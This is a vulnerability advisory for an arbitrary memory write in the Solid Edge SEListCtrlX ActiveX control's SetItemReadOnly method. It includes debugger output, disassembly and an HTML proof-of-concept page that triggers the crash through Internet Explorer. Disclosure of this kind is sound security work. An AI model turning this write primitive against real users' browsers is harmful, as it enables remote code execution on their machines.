@@ -1,0 +1,135 @@
+SIEMENS Solid Edge ST4/ST5 SEListCtrlX ActiveX Control SetItemReadOnly  
+Arbitrary Memory Rewrite Remote Code Execution Vulnerability
+
+tested against: Microsoft Windows Server 2003 r2 sp2
+                Microsoft Windows XP sp3
+                Microsoft Windows 7
+                Internet Explorer 7/8
+
+software description: http://en.wikipedia.org/wiki/Solid_Edge
+
+vendor site: http://www.siemens.com/entry/cc/en/
+
+download url: http://www.plm.automation.siemens.com/en_us/products/velocity/forms/solid-edge-student.cfm
+
+file tested: SolidEdgeV104ENGLISH_32Bit.exe
+
+
+background:
+
+the mentioned software installs an ActiveX control with 
+the following settings:
+
+ActiveX settings:
+ProgID: SELISTCTRLX.SEListCtrlXCtrl.1
+CLSID: {5D6A72E6-C12F-4C72-ABF3-32F6B70EBB0D}
+binary path: C:\Program Files\Solid Edge ST4\Program\SEListCtrlX.ocx
+Safe For Scripting (Registry): True
+Safe For Initialization (Registry): True
+
+Vulnerability:
+
+This control exposes the SetItemReadOnly() method, see typelib:
+
+...
+/* DISPID=14 */
+	function SetItemReadOnly(
+		/* VT_VARIANT [12]  */ $hItem,
+		/* VT_BOOL [11]  */ $bReadOnly 
+		)
+	{
+	}
+...
+
+(i)
+By setting to a memory address the first argument
+and the second one to 'false' you can write a NULL
+byte inside an arbitrary memory region.
+
+(ii)
+By setting to a memory address the first argument
+and the second one to 'true' you can write a \x08
+byte inside an arbitrary memory region.
+
+Example crash:
+
+EAX 61616161
+ECX 0417AB44
+EDX 01B7F530
+EBX 0000000C
+ESP 01B7F548
+EBP 01B7F548
+ESI 0417A930
+EDI 027D5DD0 SEListCt.027D5DD0
+EIP 033FD158 control.033FD158
+C 0  ES 0023 32bit 0(FFFFFFFF)
+P 1  CS 001B 32bit 0(FFFFFFFF)
+A 0  SS 0023 32bit 0(FFFFFFFF)
+Z 1  DS 0023 32bit 0(FFFFFFFF)
+S 0  FS 003B 32bit 7FFD9000(4000)
+T 0  GS 0000 NULL
+D 0
+O 0  LastErr ERROR_SUCCESS (00000000)
+EFL 00010246 (NO,NB,E,BE,NS,PE,GE,LE)
+ST0 empty -NAN FFFF FFFFFFFF FFFFFFFF
+ST1 empty 3.3760355862290856960e-4932
+ST2 empty +UNORM 48F4 00000000 00000000
+ST3 empty -2.4061003025887744000e+130
+ST4 empty -UNORM C198 00000000 00000000
+ST5 empty 0.0
+ST6 empty 1633771873.0000000000
+ST7 empty 1633771873.0000000000
+               3 2 1 0      E S P U O Z D I
+FST 4000  Cond 1 0 0 0  Err 0 0 0 0 0 0 0 0  (EQ)
+FCW 027F  Prec NEAR,53  Mask    1 1 1 1 1 1
+
+Call stack of thread 000009B8
+Address    Stack      Procedure / arguments                                                             Called from                   Frame
+01B7F54C   027D5DF3   control.?SetItemReadOnly@SEListCtrl@@QAEXPAVSEListItem@@H@Z                       SEListCt.027D5DED             01B7F548
+01B7F560   787FF820   Includes SEListCt.027D5DF3                                                        mfc100u.787FF81E              01B7F55C
+01B7F56C   78807BF5   mfc100u.787FF810                                                                  mfc100u.78807BF0              01B7F618
+01B7F61C   78808312   ? mfc100u.78807A5B                                                                mfc100u.7880830D              01B7F618
+
+
+
+vulnerable code, inside the close control.dll:
+...
+;------------------------------------------------------------------------------
+  		Align	4
+ ?SetItemReadOnly@SEListCtrl@@QAEXPAVSEListItem@@H@Z:
+  		push	ebp
+  		mov	ebp,esp
+  		mov	eax,[ebp+08h]
+  		test	eax,eax
+  		jz 	L1011D15C
+  		cmp	dword ptr [ebp+0Ch],00000000h
+  		jz 	L1011D158
+  		or	dword ptr [eax+2Ch],00000008h <-------------------- it crashes here
+  		pop	ebp
+  		retn	0008h
+;------------------------------------------------------------------------------
+...
+
+...
+;------------------------------------------------------------------------------
+ L1011D158:
+  		and	dword ptr [eax+2Ch],FFFFFFF7h <-------------------- or here           
+ L1011D15C:
+  		pop	ebp
+  		retn	0008h
+;------------------------------------------------------------------------------
+...
+
+As attachment, code to reproduce the crash.
+
+
+
+<!-- saved from url=(0014)about:internet -->
+<html>
+<object classid='clsid:5D6A72E6-C12F-4C72-ABF3-32F6B70EBB0D' id='obj' />
+</object>
+<script language='javascript'>
+//obj.SetItemReadOnly(0x61616161,false); 
+obj.SetItemReadOnly(0x61616161,true); 
+</script>
+ 
